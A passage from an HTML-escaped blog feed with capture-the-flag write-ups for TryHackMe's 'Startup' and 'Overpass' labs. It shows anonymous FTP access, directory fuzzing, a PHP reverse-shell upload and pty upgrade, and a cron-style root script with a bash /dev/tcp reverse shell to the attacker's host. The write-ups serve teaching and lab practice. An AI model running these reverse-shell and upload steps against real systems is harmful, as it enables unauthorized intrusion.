&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ftp 10.10.107.18
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Connected to 10.10.107.18.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">220&lt;/span> &lt;span class="o">(&lt;/span>vsFTPd 3.0.3&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Name &lt;span class="o">(&lt;/span>10.10.107.18:kali&lt;span class="o">)&lt;/span>: anonymous
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">331&lt;/span> Please specify the password.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">230&lt;/span> Login successful.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Remote system &lt;span class="nb">type&lt;/span> is UNIX.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Using binary mode to transfer files.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ftp&amp;gt; ls
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">229&lt;/span> Entering Extended Passive Mode &lt;span class="o">(||&lt;/span>&lt;span class="p">|&lt;/span>56482&lt;span class="p">|&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">150&lt;/span> Here comes the directory listing.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">drwxrwxrwx &lt;span class="m">2&lt;/span> &lt;span class="m">65534&lt;/span> &lt;span class="m">65534&lt;/span> &lt;span class="m">4096&lt;/span> Nov &lt;span class="m">12&lt;/span> &lt;span class="m">2020&lt;/span> ftp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rw-r--r-- &lt;span class="m">1&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">251631&lt;/span> Nov &lt;span class="m">12&lt;/span> &lt;span class="m">2020&lt;/span> important.jpg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rw-r--r-- &lt;span class="m">1&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">208&lt;/span> Nov &lt;span class="m">12&lt;/span> &lt;span class="m">2020&lt;/span> notice.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">226&lt;/span> Directory send OK.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat notice.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>We now have a name, Maya.&lt;/p>
&lt;p>The site doesn’t tell us much:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Startup-writeup-THM/main/91426f10-815e-4dce-8275-a7e4a86904b0_Export-603ed8d9-2b1a-49ce-8213-7061cce6ff07/Startup%2009519d3a5bfc4be5bd4c3ca84ece9361/Untitled.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>So I started a directory fuzzer:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ffuf -u http://10.10.107.18/FUZZ -w /usr/share/wordlists/dirb/big.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s1">&amp;#39;___\ /&amp;#39;&lt;/span>___&lt;span class="se">\ &lt;/span> /&lt;span class="err">&amp;#39;&lt;/span>___&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> /&lt;span class="se">\ \_&lt;/span>_/ /&lt;span class="se">\ \_&lt;/span>_/ __ __ /&lt;span class="se">\ \_&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span>,__&lt;span class="se">\\&lt;/span> &lt;span class="se">\ &lt;/span>,__&lt;span class="se">\/\ \/\ \ \ \ &lt;/span>,__&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\ \ \_&lt;/span>/ &lt;span class="se">\ \ \_&lt;/span>/&lt;span class="se">\ \ \_\ \ \ \ \_&lt;/span>/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_&lt;/span>___/ &lt;span class="se">\ \_\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>___/ &lt;span class="se">\/&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.1.0-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Method : GET
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: URL : http://10.10.107.18/FUZZ
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Follow redirects : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Calibration : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Timeout : &lt;span class="m">10&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Threads : &lt;span class="m">40&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.htaccess &lt;span class="o">[&lt;/span>Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 59ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.htpasswd &lt;span class="o">[&lt;/span>Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2807ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">files &lt;span class="o">[&lt;/span>Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 172ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">server-status &lt;span class="o">[&lt;/span>Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 66ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">:: Progress: &lt;span class="o">[&lt;/span>20469/20469&lt;span class="o">]&lt;/span> :: Job &lt;span class="o">[&lt;/span>1/1&lt;span class="o">]&lt;/span> :: &lt;span class="m">357&lt;/span> req/sec :: Duration: &lt;span class="o">[&lt;/span>0:00:44&lt;span class="o">]&lt;/span> :: Errors: &lt;span class="m">0&lt;/span> ::
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I discovered the files directory which is the ftp share:&lt;/p>
&lt;p>Maybe we can upload a php revshell with ftp.&lt;/p>
&lt;p>We have write access in the ftp folder:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ftp&amp;gt; &lt;span class="nb">cd&lt;/span> ftp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">250&lt;/span> Directory successfully changed.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ftp&amp;gt; put php.php
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">local: php.php remote: php.php
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">229&lt;/span> Entering Extended Passive Mode &lt;span class="o">(||&lt;/span>&lt;span class="p">|&lt;/span>40969&lt;span class="p">|&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">150&lt;/span> Ok to send data.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">100% &lt;span class="p">|&lt;/span>***************************************************************************************************&lt;span class="p">|&lt;/span> &lt;span class="m">3461&lt;/span> 70.22 MiB/s 00:00 ETA
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">226&lt;/span> Transfer complete.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">3461&lt;/span> bytes sent in 00:00 &lt;span class="o">(&lt;/span>6.92 KiB/s&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ftp&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I uploaded my pentester monkey php reverse shell&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -lvnp &lt;span class="m">4444&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">listening on &lt;span class="o">[&lt;/span>any&lt;span class="o">]&lt;/span> &lt;span class="m">4444&lt;/span> ...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">connect to &lt;span class="o">[&lt;/span>10.11.65.91&lt;span class="o">]&lt;/span> from &lt;span class="o">(&lt;/span>UNKNOWN&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>10.10.107.18&lt;span class="o">]&lt;/span> &lt;span class="m">40798&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Linux startup 4.4.0-190-generic &lt;span class="c1">#220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 20:52:55 up &lt;span class="m">37&lt;/span> min, &lt;span class="m">0&lt;/span> users, load average: 0.00, 0.05, 0.01
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">uid&lt;/span>&lt;span class="o">=&lt;/span>33&lt;span class="o">(&lt;/span>www-data&lt;span class="o">)&lt;/span> &lt;span class="nv">gid&lt;/span>&lt;span class="o">=&lt;/span>33&lt;span class="o">(&lt;/span>www-data&lt;span class="o">)&lt;/span> &lt;span class="nv">groups&lt;/span>&lt;span class="o">=&lt;/span>33&lt;span class="o">(&lt;/span>www-data&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/bin/sh: 0: can&lt;span class="err">&amp;#39;&lt;/span>t access tty&lt;span class="p">;&lt;/span> job control turned off
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ whoami
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">www-data
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And we got a shell!&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">which python
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/bin/python
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python -c &lt;span class="s1">&amp;#39;import pty; pty.spawn (&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">www-data@startup:/$
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I also spawned a nicer shell with the help of python.&lt;/p>
&lt;p>apart from the recipe, in the home directory there are also a vagrant directory, which appears to be a home directory, and an incidents directory:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ls
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bin home lib mnt root srv vagrant
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">boot incidents lib64 opt run sys var
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">dev initrd.img lost+found proc sbin tmp vmlinuz
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">etc initrd.img.old media recipe.txt snap usr vmlinuz.old
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>In the incidents there is a pcapng file which we can read with wireshark, I downloaded the file uploading it in the ftp directory:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cp suspicious.pcapng /var/www/html/files/ftp
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>From here I looked up the traffic and found out that lennie, tried to login with his credentials with the www-data account:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">Sorry, try again.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>sudo&lt;span class="o">]&lt;/span> password &lt;span class="k">for&lt;/span> www-data: &amp;lt;redacted&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So I tried logging in and it worked:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">www-data@startup:/incidents$ su lennie
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password: &amp;lt;redacted&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">lennie@startup:/incidents$
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I then grabbed the user flag, and discovered a file in the etc folder that I owned that it was executed from root, I edited it with this and got a root shell:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>bash -i &amp;gt;&lt;span class="p">&amp;amp;&lt;/span> /dev/tcp/10.11.65.91/5555 0&amp;gt;&lt;span class="p">&amp;amp;&lt;/span>&lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>Overpass Writeup THM</title><link>https://simonefelici.github.io/p/overpass-writeup-thm/</link><pubDate>Wed, 03 Jan 2024 10:00:00 +0100</pubDate><guid>https://simonefelici.github.io/p/overpass-writeup-thm/</guid><description>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Overpass-writeup-THM/main/f08d4045-89e3-45d5-9ed3-0f650f39cb59_Export-a6534518-0a1b-40b8-b980-4ff782785aa3/Overpass%205b2344c2eb5141888e86ae3e2746ed53/Untitled.png" alt="Featured image of post Overpass Writeup THM" />&lt;p>The first thing that I am going to do is a nmap scna:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap 10.10.192.193
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2024-01-01 09:30 EST
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.192.193
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.059s latency&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">998&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>conn-refused&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp open ssh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 7.19 seconds
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>From there we can see that the host is running ssh and a web page, let’s see what;s in the web page.&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Overpass-writeup-THM/main/f08d4045-89e3-45d5-9ed3-0f650f39cb59_Export-a6534518-0a1b-40b8-b980-4ff782785aa3/Overpass%205b2344c2eb5141888e86ae3e2746ed53/Untitled.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>Looking at the source code I have found this:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">Overpass allows you to securely store different
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> passwords &lt;span class="k">for&lt;/span> every service, protected using military grade
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;!--Yeah right, just because the Romans used it doesn&lt;span class="err">&amp;#39;&lt;/span>t make it military grade, change this?--&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> cryptography to keep you safe.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>The commented part can be a hint that the password are stored using ROT13.&lt;/p>
&lt;p>After that I ran a directory discovery scan:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ffuf -u http://10.10.192.193/FUZZ -w /usr/share/wordlists/dirb/big.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s1">&amp;#39;___\ /&amp;#39;&lt;/span>___&lt;span class="se">\ &lt;/span> /&lt;span class="err">&amp;#39;&lt;/span>___&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> /&lt;span class="se">\ \_&lt;/span>_/ /&lt;span class="se">\ \_&lt;/span>_/ __ __ /&lt;span class="se">\ \_&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span>,__&lt;span class="se">\\&lt;/span> &lt;span class="se">\ &lt;/span>,__&lt;span class="se">\/\ \/\ \ \ \ &lt;/span>,__&lt;span class="se">\
